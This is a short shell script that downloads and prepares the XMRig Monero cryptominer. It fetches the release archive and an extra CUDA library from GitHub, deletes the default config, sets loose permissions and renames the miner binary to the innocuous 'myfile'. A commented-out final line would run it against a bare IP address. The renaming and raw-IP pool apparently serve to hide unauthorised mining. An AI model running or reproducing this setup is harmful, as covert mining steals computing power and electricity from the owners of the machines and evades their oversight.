wget https://github.com/MoneroOcean/xmrig/releases/download/v6.12.1-mo2/xmrig-v6.12.1-mo2-lin64-compat.tar.gz -O out 
tar -xvf out 
chmod 777 xmrig 
rm config.json 
rm out 
mv xmrig myfile
wget https://github.com/dercodeKoenig/test/raw/main/cuda.so -O libxmrig-cuda.so
#./myfile -o 79.231.42.249
